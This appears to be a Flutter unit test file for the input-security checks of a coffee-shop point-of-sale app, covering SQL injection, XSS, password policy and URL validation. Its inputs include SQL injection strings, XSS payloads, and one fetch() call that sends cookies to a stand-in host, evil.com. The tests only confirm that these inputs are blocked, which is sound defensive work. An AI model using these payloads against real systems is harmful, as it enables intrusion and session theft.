import 'package:flutter_test/flutter_test.dart';
import 'package:pos_sakopi/core/utils/security_audit_logger.dart';
import 'package:pos_sakopi/core/utils/security_utils.dart';

void main() {
  group('Self-Testing Keamanan POS Sakopi Saroja', () {
    test('Skenario 1: Mencegah SQL Injection pada Form Input dan Email', () {
      expect(
        SecurityUtils.containsSqlInjection("' OR '1'='1"),
        isTrue,
      );
      expect(
        SecurityUtils.containsSqlInjection("Kopi'; DROP TABLE products;--"),
        isTrue,
      );
      expect(
        SecurityUtils.containsSqlInjection("1 UNION SELECT id, email FROM users_profile"),
        isTrue,
      );
      expect(
        SecurityUtils.validateEmail("admin@sakopi.com' OR 1=1--"),
        contains('SQL Injection'),
      );
      expect(
        SecurityUtils.validateSafeText("Kopi Susu Gula Aren", fieldName: 'Nama Produk'),
        isNull,
      );
    });

    test('Skenario 2: Mencegah Cross-Site Scripting (XSS) pada Form & Parameter URL', () {
      expect(
        SecurityUtils.containsXss("<script>alert('XSS')</script>"),
        isTrue,
      );
      expect(
        SecurityUtils.containsXss("<img src=x onerror=alert(document.cookie)>"),
        isTrue,
      );
      expect(
        SecurityUtils.containsXss("javascript:alert(1)"),
        isTrue,
      );
      expect(
        SecurityUtils.validateSafeText(
          "<script>fetch('https://evil.com?c='+document.cookie)</script>",
          fieldName: 'Deskripsi Pengeluaran',
        ),
        contains('XSS'),
      );
    });

    test('Skenario 3: Menolak Password Lemah pada Registrasi (Strong Password Policy)', () {
      // Kurang dari 8 karakter
      expect(
        SecurityUtils.validateStrongPassword('Kopi1!'),
        contains('Minimal 8 karakter'),
      );
      // Password umum di blacklist
      expect(
        SecurityUtils.validateStrongPassword('password123'),
        contains('terlalu umum/lemah'),
      );
      // Tanpa huruf besar
      expect(
        SecurityUtils.validateStrongPassword('sakopi2026!'),
        contains('huruf besar'),
      );
      // Tanpa simbol
      expect(
        SecurityUtils.validateStrongPassword('Sakopi2026'),
        contains('simbol'),
      );
      // Password kuat yang valid
      expect(
        SecurityUtils.validateStrongPassword('Sakopi@2026!'),
        isNull,
      );
    });

    test('Skenario 4: Validasi URL Gambar & Harga Positif (Anti-SSRF & Logic Tampering)', () {
      expect(
        SecurityUtils.validateSafeUrl('javascript:alert(1)'),
        isNotNull,
      );
      expect(
        SecurityUtils.validateSafeUrl('https://placehold.co/150/155e75/FFFFFF?text=Kopi'),
        isNull,
      );
      expect(
        SecurityUtils.validatePositiveNumber('-15000', fieldName: 'Harga Produk'),
        contains('lebih besar dari Rp 0'),
      );
      expect(
        SecurityUtils.validatePositiveNumber('18000', fieldName: 'Harga Produk'),
        isNull,
      );
    });

    test('Skenario 5: Pencatatan Otomatis pada Security Audit Log', () {
      final initialCount = SecurityAuditLogger.logs.length;
      SecurityUtils.validateSafeText("<script>alert(1)</script>", fieldName: 'Uji XSS');
      expect(SecurityAuditLogger.logs.length, greaterThan(initialCount));
      expect(SecurityAuditLogger.logs.first.eventType, equals('XSS_ATTEMPT_BLOCKED'));
    });
  });
}
